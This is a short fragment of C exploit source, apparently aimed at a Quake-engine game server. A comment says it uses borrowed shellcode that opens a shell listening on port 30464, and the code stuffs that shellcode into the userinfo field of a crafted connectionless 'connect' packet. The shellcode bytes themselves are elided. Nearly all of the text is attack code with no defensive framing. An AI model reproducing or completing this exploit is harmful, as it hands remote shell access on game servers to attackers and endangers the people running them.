...
/* 
 * shellcode which spawns shell on port 30464
 * borrowed from http://www.l0t3k.net/tools/ShellCode/Linux-x86/
*/
char shellcode[] =
...
//		255, 255, 255, 255,	PROTOCOL_VERSION, cls.qport, cls.challenge, cls.userinfo);
	...
	sprintf (buff, "\\name\\exploit\\rate\\2500\\code\\%s", shellcode);
	sprintf (data, "%c%c%c%cconnect %i %i %i \"%s\"\n",
		255, 255, 255, 255, PROTOCOL_VERSION, cls.qport, cls.challenge, buff);
